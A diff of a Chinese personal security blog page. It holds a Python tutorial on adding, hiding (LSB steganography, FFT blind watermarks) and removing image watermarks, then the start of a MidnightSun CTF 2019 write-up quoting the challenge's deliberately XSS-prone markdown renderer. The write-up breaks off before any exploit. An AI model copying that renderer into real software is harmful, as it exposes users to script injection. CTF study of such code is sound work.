@@ -1,34 +1,2790 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="microworld,bubbl3@foxmail.com"><title></title><meta name="description" content="A Blog Powered By Hexo"><meta name="keywords" content="security,pentest,personal"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/"></a></h3><div class="description"><p>及时行乐.</p></div></div></div><ul class="social-links"><li><a href="https://twitter.com/www.baidu.com"><i class="fa fa-twitter"></i></a></li><li><a href="http://weibo.com/www.baidu.com"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a class="current" href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/04/09/图像/watermark/">watermark resolve</a></h3></div><div class="post-content"><p>watermark resolve水印原理一般性水印常见于纸币，图片。图片水印标志着图片个人所有权，通常就是将两张图片进行叠加，或向另一张图片写入一些标志信息
-简单使用：
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>第 4 页 | </title>
 
-添加文字：
+  
+  <meta name="author" content="damn1t">
+  
 
-from PIL import Image, ImageDraw, ImageFont
+  
 
-# 指定要使用的字体和大小；/Lib...</p></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-04-09</span><i class="fa fa-tag"></i><a class="tag" href="/tags/watermark/" title="watermark">watermark </a></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2019/04/08/CTF/MidnightSun CTF 2019/">MidnightSun CTF 2019</a></h3></div><div class="post-content"><p>MidnightSun CTF 2019MARCODOWNO点入主页面的链接，查看源码，注意到regexp的规则
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  
+
+  <meta property="og:site_name" content=""/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/"></a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/04/09/图像/watermark/"><span>watermark resolve</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/09/图像/watermark/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-09T09:38:52.029Z">
+          2019-04-09
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="watermark-resolve"><a href="#watermark-resolve" class="headerlink" title="watermark resolve"></a>watermark resolve</h1><h2 id="水印原理"><a href="#水印原理" class="headerlink" title="水印原理"></a>水印原理</h2><h3 id="一般性水印"><a href="#一般性水印" class="headerlink" title="一般性水印"></a>一般性水印</h3><p>常见于纸币，图片。图片水印标志着图片个人所有权，通常就是将两张图片进行叠加，或向另一张图片写入一些标志信息</p>
+<p>简单使用：</p>
+<ul>
+<li>添加文字：</li>
+</ul>
+<pre><code>from PIL import Image, ImageDraw, ImageFont
+
+# 指定要使用的字体和大小；/Library/Fonts/是macOS字体目录；Linux的字体目录是/usr/share/fonts/; windows是C:/windows/fonts/
+font = ImageFont.truetype(&apos;C:/windows/fonts/Arial.ttf&apos;, 24)
+
+# image: 图片   text：要添加的文本  font：字体
+def add_text_to_image(image, text, font=font):
+    rgba_image = image.convert(&apos;RGBA&apos;)
+    text_overlay = Image.new(&apos;RGBA&apos;, rgba_image.size, (255, 255, 255, 0))
+    image_draw = ImageDraw.Draw(text_overlay)
+
+    text_size_x, text_size_y = image_draw.textsize(text, font=font)
+    # 设置文本文字位置
+    print(rgba_image)
+    text_xy = (rgba_image.size[0] - text_size_x, rgba_image.size[1] - text_size_y)
+    # 设置文本颜色和透明度
+    image_draw.text(text_xy, text, font=font, fill=(76, 234, 124, 180))
+
+    image_with_text = Image.alpha_composite(rgba_image, text_overlay)
+
+    return image_with_text
+
+im_before = Image.open(&quot;1.jpg&quot;)
+im_before.show()
+im_after = add_text_to_image(im_before, &apos;WTF&apos;)
+#im_after.show()
+im_after.save(&apos;im_after.jpg&apos;)
+</code></pre><p><img src="https://i.imgur.com/VtVWRYl.jpg" alt=""></p>
+<ul>
+<li>添加图片：</li>
+</ul>
+<pre><code>from PIL import Image, ImageDraw
+
+def add_watermark_to_image(image, watermark):
+    rgba_image = image.convert(&apos;RGBA&apos;)
+    rgba_watermark = watermark.convert(&apos;RGBA&apos;)
+
+    image_x, image_y = rgba_image.size
+    watermark_x, watermark_y = rgba_watermark.size
+
+    # 缩放图片
+    scale = 10
+    watermark_scale = max(image_x / (scale * watermark_x), image_y / (scale * watermark_y))
+    new_size = (int(watermark_x * watermark_scale), int(watermark_y * watermark_scale))
+    rgba_watermark = rgba_watermark.resize(new_size, resample=Image.ANTIALIAS)
+    # 透明度
+    rgba_watermark_mask = rgba_watermark.convert(&quot;L&quot;).point(lambda x: min(x, 180))
+    rgba_watermark.putalpha(rgba_watermark_mask)
+
+    watermark_x, watermark_y = rgba_watermark.size
+    # 水印位置
+    rgba_image.paste(rgba_watermark, (image_x - watermark_x, image_y - watermark_y), rgba_watermark_mask)
+
+    return rgba_image
+
+im_before = Image.open(&quot;1.jpg&quot;)#目标图
+im_before.show()
+
+im_watermark = Image.open(&quot;timg.jpg&quot;)#选择水印图
+im_after = add_watermark_to_image(im_before, im_watermark)
+im_after.show()
+# im.save(&apos;im_after.jpg&apos;)
+</code></pre><ul>
+<li>使用<a href="https://github.com/SixQuant/nowatermark" target="_blank" rel="noopener">nowatermark</a>去除水印</li>
+</ul>
+<pre><code>from nowatermark import WatermarkRemover
+
+path = &apos;./data/&apos;
+
+watermark_template_filename = path + &apos;anjuke-watermark-template.jpg&apos;
+remover = WatermarkRemover()
+remover.load_watermark_template(watermark_template_filename)
+
+remover.remove_watermark(path + &apos;anjuke3.jpg&apos;, path + &apos;anjuke3-result.jpg&apos;)
+remover.remove_watermark(path + &apos;anjuke4.jpg&apos;, path + &apos;anjuke4-result.jpg&apos;)
+</code></pre><h3 id="数字水印"><a href="#数字水印" class="headerlink" title="数字水印"></a>数字水印</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><blockquote>
+<p>数字水印（Digital Watermarking）技术是将一些标识信息（即数字水印）直接嵌入数字载体当中（包括多媒体、文档、软件等）或是间接表示（修改特定区域的结构），且不影响原载体的使用价值，也不容易被探知和再次修改。但可以被生产方识别和辨认。通过这些隐藏在载体中的信息，可以达到确认内容创建者、购买者、传送隐秘信息或者判断载体是否被篡改等目的。数字水印是保护信息安全、实现防伪溯源、版权保护的有效办法，是信息隐藏技术研究领域的重要分支和研究方向</p>
+</blockquote>
+<h4 id="特性："><a href="#特性：" class="headerlink" title="特性："></a>特性：</h4><blockquote>
+<p>(1) 隐蔽性<br>也称不可感知性，即对于不可见水印处理系统，水印嵌入算法不应产生可感知的数据修改，也就是水印在通常的视觉条件下应该是不可见的，水印的存在不会影响作品的视觉效果。<br>(2) 鲁棒性<br>水印必须很难去掉(希望不可能去掉)，当然在理论上任何水印都可以去掉，只要对水印的嵌入过程有足够的了解，但是如果对水印的嵌入只是部分了解的话，任何破坏或消除水印的企图都应导致载体严重的降质而不可用。<br>(3) 抗篡改性<br>与抗毁坏的鲁棒性不同，抗篡改性是指水印一旦嵌入到载体中，攻击者就很难改变或伪造。鲁棒性要求高的应用，通常也需要很强的抗篡改性。在版权保护中，要达到好的抗窜改性是比较困难的。<br>(4) 水印容量<br>嵌入的水印信息必须足以表示多媒体内容的创建者或所有者的标志信息，或是购买者的序列号。这样在发生版权纠纷时，创建者或所有者的信息用于标示数据的版权所有者，而序列号用于标示违反协议而为盗版提供多媒体数据的用户。<br>(5) 安全性<br>应确保嵌入信息的保密性和较低的误检测率。水印可以是任何形式的数据，比如数值、文本、图像等。所有的水印都包含一个水印嵌入系统和水印恢复系统。<br>(6) 低错误率<br>即使在不受攻击或者无信号失真的情况下，也要求不能检测到水印(漏检、false -negative) 以及不存在水印的情况下，检测到水印(虚检、false - positive) 的概率必须非常小。</p>
+</blockquote>
+<h4 id="算法（这个坑以后再填，有点复杂）"><a href="#算法（这个坑以后再填，有点复杂）" class="headerlink" title="算法（这个坑以后再填，有点复杂）"></a>算法（这个坑以后再填，有点复杂）</h4><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ul>
+<li>按水印的特性<br>鲁棒数字水印：要求嵌入的水印能够经受各种常用的编辑处理<br>脆弱数字水印：需要对信号的改动足够敏感，是人们能够根据脆弱水印的状态判断出数据是否被篡改。</li>
+</ul>
+<ul>
+<li>按水印的检测过程<br>明文水印：检测工程中，需要原始数据。普遍来讲，鲁棒性较之盲水印要好。<br>盲水印：只需要秘钥，不需要原始数据</li>
+</ul>
+<ul>
+<li>按水印的内容<br>有意义水印：水印是商标、音频片段等<br>无意义水印：序列号，仅检测是否含水印</li>
+</ul>
+<ul>
+<li>按水印的隐藏位置<br>空域<br>频域<br>时域<blockquote>
+<p>时（空）域数字水印是直接在信号空间上叠加水印信息，而频域数字水印、时/频域数字水印和时间/尺度域数字水印则分别是在DCT变换域、时/ 频变换域和小波变换域上隐藏水印</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h4><ul>
+<li>lsb隐写</li>
+</ul>
+<p>LSB全称leastsignificant bit，最低有效位</p>
+<p>PNG文件中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色</p>
+<p>人类的眼睛可以区分约1000万种不同的颜色</p>
+<p>这意味着人类的眼睛无法区分余下的颜色大约有6777216种</p>
+<p>LSB隐写就是修改RGB颜色分量的最低二进制位（LSB），而人类的眼睛不会注意到这前后的变化</p>
+<p>每个像数可以携带3比特的信息</p>
+<p>一些概念：</p>
+<ul>
+<li><p>位深度：位深度是指在记录数字图像的颜色时，计算机实际上是用每个像素需要的位深度来表示的。计算机之所以能够显示颜色，是采用了一种称作“位”( bit ) 的记数单位来记录所表示颜色的数据。当这些数据按照一定的编排方式被记录在计算机中，就构成了一个数字图像的计算机文件。“位”( bit )是计算机存储器里的最小单元，它用来记录每一个像素颜色的值。图像的色彩越丰富，“位”就越多。每一个像素在计算机中所使用的这种位数就是“位深度”。</p>
+</li>
+<li><p>像素点<br>像素点是最小的图像单元，一张图片由好多的像素点组成。<br>图片尺寸是500 <em> 338 的，表示图片是由一个500 </em> 338的像素点矩阵构成的，这张图片的宽度是500个像素点的长度，高度是338个像素点的长度，共有500 * 338 = 149000个像素点。 </p>
+</li>
+</ul>
+<ul>
+<li><p>像素<br>把鼠标放在一个图片上，这个时候会显示尺寸和大小，这里的尺寸就是像素。</p>
+</li>
+<li><p>RGB<br>​因为一个像素点的颜色是由RGB三个值来表现的，所以像素点矩阵对应三个颜色向量矩阵，分别是R矩阵(500 <em>338大小)，G矩阵(500 </em>338大小)，B矩阵(500 *338大小)。如果每个矩阵的第一行第一列的值分别为：R：240，G：223，B：204，所以这个像素点的颜色就是（240,223,204）</p>
+</li>
+</ul>
+<ul>
+<li>灰度<br>灰度是表明图像明暗的数值，即黑白图像中点的颜色深度，范围一般从0到255，白色为255 ，黑色为0，故黑白图片也称灰度图像。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。</li>
+</ul>
+<ul>
+<li>图像的灰度化<br>灰度就是没有色彩，RGB色彩分量全部相等。图像的灰度化就是让像素点矩阵中的每一个像素点都满足关系：R=G=B，此时的这个值叫做灰度值。如RGB(100,100,100)就代表灰度值为100,RGB(50,50,50)代表灰度值为50。</li>
+</ul>
+<ul>
+<li>灰度化处理</li>
+</ul>
+<blockquote>
+<p>一般灰度化处理的方法：在灰度化的图像中灰度值的范围为0~255</p>
+<p>1.浮点算法：Gray=R<em>0.3+G</em>0.59+B*0.11                R=G=B</p>
+<p>2.整数方法：Gray=(R<em>30+G</em>59+B*11)/100              R=G=B</p>
+<p>3.移位方法：Gray =(R<em>28+G</em>151+B*77)&gt;&gt;8            R=G=B</p>
+<p>4.平均值法：Gray=（R+G+B）/3                            R=G=B</p>
+<p>5.仅取绿色：Gray=G                                              R=G=B</p>
+<p>二值化处理的方法：</p>
+<p>二值化就是让图像的像素点矩阵中的每个像素点的灰度值为0（黑色）或者255（白色），也就是让整个图像呈现只有黑和白的效果。在二值化后的图像中的灰度值范围是0或者255。那么一个像素点在灰度化之后的灰度值怎么转化为0或者255呢？比如灰度值为100，那么在二值化后到底是0还是255?这就涉及到取一个阀值的问题。</p>
+<p>1、取阀值为127（相当于0~255的中数，（0+255）/2=127），让灰度值小于等于127的变 为0（黑色），灰度值大于127的变为255（白色），这样做的好处是计算量小速度快，但是 缺点也是很明显的，因为这个阀值在不同的图片中均为127，但是不同的图片，他们的颜色分布差别很大，所以用127做阀值，白菜萝卜一刀切，效果肯定是不好的。</p>
+<p>2、计算像素点矩阵中的所有像素点的灰度值的平均值avg</p>
+<p>（像素点1灰度值+…+像素点n灰度值）/ n = 像素点平均值avg，然后让每一个像素点与avg一 一比较，小于等于avg的像素点就为0（黑色），大于avg的 像 素点为255（白色），这样做比方法1好一些。</p>
+<p>3、使用直方图方法（也叫双峰法）来寻找二值化阀值，直方图是图像的重要特质。直方图方法 认为图像由前景和背景组成，在灰度直方图上，前景和背景都形成高峰，在双峰之间的最低谷处就是阀值所在。取到阀值之后再一 一比较就可以了。</p>
+</blockquote>
+<ul>
+<li>灰度值与像素值的关系<br>如果对于一张本身就是灰度图像（8位灰度图像）来说，他的像素值就是它的灰度值，如果是一张彩色图像，则它的灰度值需要经过函数映射来得到。灰度图像是由纯黑和纯白来过渡得到的，在黑色中加入白色就得到灰色，纯黑和纯白按不同的比例来混合就得到不同的灰度值。R=G=B=255为白色，R=G=B=0为黑色，R=G=B=小于255的某个整数时，此时就为某个灰度值。</li>
+</ul>
+<ul>
+<li>灰度级<br>灰度级表明图像中不同灰度的最大数量。灰度级越大，图像的亮度范围越大。</li>
+</ul>
+<ul>
+<li>图像分辨率<br>图像分辨率是指每英寸图像内的像素点数。图像分辨率是有单位的，叫ppi（像素每英寸）。分辨率越高，像素的点密度越高，图像越逼真（这就是为什么做大幅的喷绘时，要求图片分辨率要高，就是为了保证每英寸的画面上拥有更多的像素点）。</li>
+</ul>
+<ul>
+<li>空间分辨率<br>空间分辨率是指图像可辨认的临界物体空间几何长度的最小极限。如果一幅图像的尺寸为MxN，表明在成像时采集了MxN个样本，空间分辨率是MxN。下图是空间分辨率从1024x1024、512x512、256x256、128x128、64x64、32x32pixels</li>
+</ul>
+<ul>
+<li>幅度分辨率<br>幅度分辨率是指幅度离散，每个像素都有一个强度值，称该像素的灰度，一般量化采用8bit。例如8bit的灰度级为2的八次方即256。0~255</li>
+</ul>
+<ul>
+<li>屏幕分辨率<br>屏幕分辨率是屏幕每行的像素点数*每列的像素点数，每个屏幕有自己的分辨率。屏幕分辨率越高，所呈现的色彩越多，清晰度越高。</li>
+</ul>
+<ul>
+<li>图像所需要的位数b<blockquote>
+<p>b=MxNxK      MxN是空间分辨率 ；K幅度分辨率，单位是bit</p>
+<p>存储1幅32 x 32，16个灰度级的图需要 4,096 bit</p>
+<p>存储1幅512 x 512，256个灰度级的图需要 2,097,152 bit </p>
+</blockquote>
+</li>
+</ul>
+<ul>
+<li>对比度：指一幅图中灰度反差的大小<br>对比度 =  最大亮度/最小亮度</li>
+</ul>
+<ul>
+<li>与清晰度相关的因素：<blockquote>
+<p>亮度</p>
+<p>对比度</p>
+<p>尺寸大小</p>
+<p>细微层次</p>
+<p>颜色饱和度</p>
+</blockquote>
+</li>
+</ul>
+<p>既然修改最低位不会容易让人察觉，那么于是可以利用最低位进行信息的隐写，容易想到的是，每个像素点可以携带<strong>3bit</strong>的有效信息。</p>
+<p><img src="https://segmentfault.com/img/bVbgeGG?w=865&amp;h=331" alt=""></p>
+<p><img src="https://segmentfault.com/img/bVbgeGI?w=675&amp;h=227" alt=""></p>
+<p><img src="https://segmentfault.com/img/bVbgeGK?w=624&amp;h=332" alt=""></p>
+<p>github上有两个关于lsb的project：<br><a href="https://github.com/RobinDavid/LSB-Steganography" target="_blank" rel="noopener">https://github.com/RobinDavid/LSB-Steganography</a><br><a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="noopener">https://github.com/cyberinc/cloacked-pixel</a></p>
+<p>python2的lsb脚本：</p>
+<pre name="code" class="python">
+# -*- coding: UTF-8 -*-
+from PIL import Image
+
+def plus(str):
+    #Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。
+    return str.zfill(8)
+
+def get_key(str):
+    #获取要隐藏的文件内容
+    tmp = str
+    f = file(tmp,"rb")
+    col = ""
+    s = f.read()
+    for i in range(len(s)):
+        #逐个字节将要隐藏的文件内容转换为二进制，并拼接起来
+        #1.先用ord()函数将s的内容逐个转换为ascii码
+        #2.使用bin()函数将十进制的ascii码转换为二进制
+        #3.由于bin()函数转换二进制后，二进制字符串的前面会有"0b"来表示这个字符串是二进制形式，所以用replace()替换为空
+        #4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位
+        col = col+plus(bin(ord(s[i])).replace('0b',''))
+
+    f.closed
+    return col
+
+def mod(x,y):
+    return x%y
+
+#str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径
+def func(str1,str2,str3):
+    im = Image.open(str1)
+    #获取图片的宽和高
+    width = im.size[0]
+    print "width:"+str(width)+"\n"
+    height = im.size[1]
+    print "height:"+str(height)+"\n"
+    count = 0
+    #获取需要隐藏的信息
+    key = get_key(str2)
+    keylen = len(key)
+    for h in range(0,height):
+        for w in range(0,width):
+            pixel = im.getpixel((w,h))
+            a = pixel[0]
+            b = pixel[1]
+            c = pixel[2]
+
+            if count == keylen:
+                break
+            #下面的操作是将信息隐藏进去
+            #分别将每个像素点的RGB值余2，这样可以去掉最低位的值
+            #再从需要隐藏的信息中取出一位，转换为整型
+            #两值相加，就把信息隐藏起来了
+            a = a-mod(a,2)+int(key[count])
+            count+=1
+            if count == keylen:
+                im.putpixel((w,h),(a,b,c))
+                break
+
+            b = b-mod(b,2)+int(key[count])
+            count+=1
+
+            if count == keylen:
+                im.putpixel((w,h),(a,b,c))
+                break
+
+            c = c-mod(c,2)+int(key[count])
+            count+=1
+
+            if count == keylen:
+                im.putpixel((w,h),(a,b,c))
+                break
+
+            if count%3 == 0:
+                im.putpixel((w,h),(a,b,c))
+
+        im.save(str3)
+
+#原图
+old = "1.png"
+#处理后输出的图片路径
+new = "output.png"
+#需要隐藏的信息
+enc = "flag.txt"
+
+func(old,enc,new)
+</pre>
+
+<ul>
+<li>使用脚本</li>
+</ul>
+<h4 id="盲水印-1"><a href="#盲水印-1" class="headerlink" title="盲水印"></a>盲水印</h4><p><a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">项目地址</a></p>
+<pre name="code" class="python">
+if cmd == 'encode':
+    print 'image<%s> + watermark<%s> -> image(encoded)<%s>' % (fn1, fn2, fn3)
+    img = cv2.imread(fn1)
+    wm = cv2.imread(fn2)
+
+    if debug:
+        plt.subplot(231), plt.imshow(bgr_to_rgb(img)), plt.title('image')
+        plt.xticks([]), plt.yticks([])
+        plt.subplot(234), plt.imshow(bgr_to_rgb(wm)), plt.title('watermark')
+        plt.xticks([]), plt.yticks([])
+
+    # print img.shape # 高, 宽, 通道
+    h, w = img.shape[0], img.shape[1]
+    hwm = np.zeros((int(h * 0.5), w, img.shape[2]))
+    assert hwm.shape[0] > wm.shape[0]
+    assert hwm.shape[1] > wm.shape[1]
+    hwm2 = np.copy(hwm)
+    for i in xrange(wm.shape[0]):
+        for j in xrange(wm.shape[1]):
+            hwm2[i][j] = wm[i][j]
+
+    random.seed(seed)
+    m, n = range(hwm.shape[0]), range(hwm.shape[1])
+    random.shuffle(m)
+    random.shuffle(n)
+    for i in xrange(hwm.shape[0]):
+        for j in xrange(hwm.shape[1]):
+            hwm[i][j] = hwm2[m[i]][n[j]]
+
+    rwm = np.zeros(img.shape)
+    for i in xrange(hwm.shape[0]):
+        for j in xrange(hwm.shape[1]):
+            rwm[i][j] = hwm[i][j]
+            rwm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = hwm[i][j]
+
+    if debug:
+        plt.subplot(235), plt.imshow(bgr_to_rgb(rwm)), \
+            plt.title('encrypted(watermark)')
+        plt.xticks([]), plt.yticks([])
+
+    f1 = np.fft.fft2(img)
+    f2 = f1 + alpha * rwm
+    _img = np.fft.ifft2(f2)
+
+    if debug:
+        plt.subplot(232), plt.imshow(bgr_to_rgb(np.real(f1))), \
+            plt.title('fft(image)')
+        plt.xticks([]), plt.yticks([])
+
+    img_wm = np.real(_img)
+
+    assert cv2.imwrite(fn3, img_wm, [int(cv2.IMWRITE_JPEG_QUALITY), 100])
+
+    # 这里计算下保存前后的(溢出)误差
+    img_wm2 = cv2.imread(fn3)
+    sum = 0
+    for i in xrange(img_wm.shape[0]):
+        for j in xrange(img_wm.shape[1]):
+            for k in xrange(img_wm.shape[2]):
+                sum += np.power(img_wm[i][j][k] - img_wm2[i][j][k], 2)
+    miss = np.sqrt(sum) / (img_wm.shape[0] * img_wm.shape[1] * img_wm.shape[2]) * 100
+    print 'Miss %s%% in save' % miss
+
+    if debug:
+        plt.subplot(233), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \
+            plt.title('image(encoded)')
+        plt.xticks([]), plt.yticks([])
+
+    f2 = np.fft.fft2(img_wm)
+    rwm = (f2 - f1) / alpha
+    rwm = np.real(rwm)
+
+    wm = np.zeros(rwm.shape)
+    for i in xrange(int(rwm.shape[0] * 0.5)):
+        for j in xrange(rwm.shape[1]):
+            wm[m[i]][n[j]] = np.uint8(rwm[i][j])
+    for i in xrange(int(rwm.shape[0] * 0.5)):
+        for j in xrange(rwm.shape[1]):
+            wm[rwm.shape[0] - i - 1][rwm.shape[1] - j - 1] = wm[i][j]
+
+    if debug:
+        assert cv2.imwrite('_bwm.debug.wm.jpg', wm)
+        plt.subplot(236), plt.imshow(bgr_to_rgb(wm)), plt.title(u'watermark')
+        plt.xticks([]), plt.yticks([])
+
+    if debug:
+        plt.show()
+</%s></%s></%s></pre>
+
+<p>这是添加水印的代码</p>
+<p>添加盲水印的方法简单可以分为频域方法和空域方法，这两种方法添加了冗余信息，但在编码和压缩情况不变的情况下，不会使原始图像大小产生变化（原来是10MB添加盲水印之后还是10MB）</p>
+<p>空域是指空间域，我们日常所见的图像就是空域。空域添加数字水印的方法是在空间域直接对图像操作（之所以说的这么绕，是因为不仅仅原图是空域，原图的差分等等也是空域），比如将水印直接叠加在图像上。</p>
+<p>我们常说一个音有多高，这个音高是指频率；同样，图像灰度变化强烈的情况，也可以视为图像的频率。频域添加数字水印的方法，是指通过某种变换手段（傅里叶变换，离散余弦变换，小波变换等）将图像变换到频域（小波域），在频域对图像添加水印，再通过逆变换，将图像转换为空间域。相对于空域手段，频域手段隐匿性更强，抗攻击性更高。</p>
+<p>reference：<br><a href="https://www.jianshu.com/p/08041bcf0f23" target="_blank" rel="noopener">https://www.jianshu.com/p/08041bcf0f23</a><br><a href="https://blog.csdn.net/Strive_0902/article/details/78023080" target="_blank" rel="noopener">https://blog.csdn.net/Strive_0902/article/details/78023080</a><br><a href="https://segmentfault.com/a/1190000016223897?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016223897?utm_source=tag-newest</a><br><a href="https://blog.csdn.net/qq_26090065/article/details/82469266" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/82469266</a><br><a href="https://peterpan980927.cn/2017/11/24/%E7%9B%B2%E6%B0%B4%E5%8D%B0%E6%8A%80%E6%9C%AF/" target="_blank" rel="noopener">https://peterpan980927.cn/2017/11/24/%E7%9B%B2%E6%B0%B4%E5%8D%B0%E6%8A%80%E6%9C%AF/</a><br><a href="https://blog.csdn.net/u011983997/article/details/80420339" target="_blank" rel="noopener">https://blog.csdn.net/u011983997/article/details/80420339</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/watermark/">watermark</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/04/08/CTF/MidnightSun CTF 2019/"><span>MidnightSun CTF 2019</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/04/08/CTF/MidnightSun CTF 2019/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-04-08T10:04:20.524Z">
+          2019-04-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="MidnightSun-CTF-2019"><a href="#MidnightSun-CTF-2019" class="headerlink" title="MidnightSun CTF 2019"></a>MidnightSun CTF 2019</h1><h2 id="MARCODOWNO"><a href="#MARCODOWNO" class="headerlink" title="MARCODOWNO"></a>MARCODOWNO</h2><p>点入主页面的链接，查看源码，注意到regexp的规则</p>
+<pre><code>input = decodeURIComponent(location.search.match(/input=([^&amp;#]+)/)[1]);
+
+function markdown(text) {
+text = text.
+replace(/[&lt;]/g, &apos;&apos;).
+replace(/----/g, &apos;&lt;hr&gt;&apos;).
+replace(/&gt; ?([^\n]+)/g, &apos;&lt;blockquote&gt;$1&lt;/blockquote&gt;&apos;).
+replace(/\*\*([^*]+)\*\*/g, &apos;&lt;b&gt;$1&lt;/b&gt;&apos;).
+replace(/__([^_]+)__/g, &apos;&lt;b&gt;$1&lt;/b&gt;&apos;).
+replace(/\*([^\s][^*]+)\*/g, &apos;&lt;i&gt;$1&lt;/i&gt;&apos;).
+replace(/\* ([^*]+)/g, &apos;&lt;li&gt;$1&lt;/li&gt;&apos;).
+replace(/##### ([^#\n]+)/g, &apos;&lt;h5&gt;$1&lt;/h5&gt;&apos;).
+replace(/#### ([^#\n]+)/g, &apos;&lt;h4&gt;$1&lt;/h4&gt;&apos;).
+replace(/### ([^#\n]+)/g, &apos;&lt;h3&gt;$1&lt;/h3&gt;&apos;).
+replace(/## ([^#\n]+)/g, &apos;&lt;h2&gt;$1&lt;/h2&gt;&apos;).
+replace(/# ([^#\n]+)/g, &apos;&lt;h1&gt;$1&lt;/h1&gt;&apos;).
+replace(/(?&lt;!\()(https?:\/\/[a-zA-Z0-9./?#-]+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;).
+replace(/!\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#]+)\)/g, &apos;&lt;img src=&quot;$2&quot; alt=&quot;$1&quot;/&gt;&apos;).
+replace(/(?&lt;!!)\[([^\]]+)\]\((https?:\/\/[a-zA-Z0-9./?#-]+)\)/g, &apos;&lt;a href=&quot;$2&quot;&gt;$1&lt;/a&gt;&apos;).
+replace(/`([^`]+)`/g, &apos;&lt;code&gt;$1&lt;/code&gt;&apos;).replace(/```([^`]+)```/g, &apos;&lt;code&gt;$1&lt;/code&gt;&apos;).
+replace(/\n/g, &quot;&lt;br&gt;&quot;);
+return text;
+}
+
+window.onload = function() {
+$(&quot;#markdown&quot;).text(input);
+$(&quot;#rendered&quot;).html(markdown(input));
+}
+</code></pre><p>关于<a href="http://www.w3school.com.cn/jsref/jsref_replace.asp" target="_blank" rel="noopener">replace函数</a>：<br>replace() 方法用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串<br>语法：stringObject.replace(regexp/substr,replacement)</p>
+<blockquote>
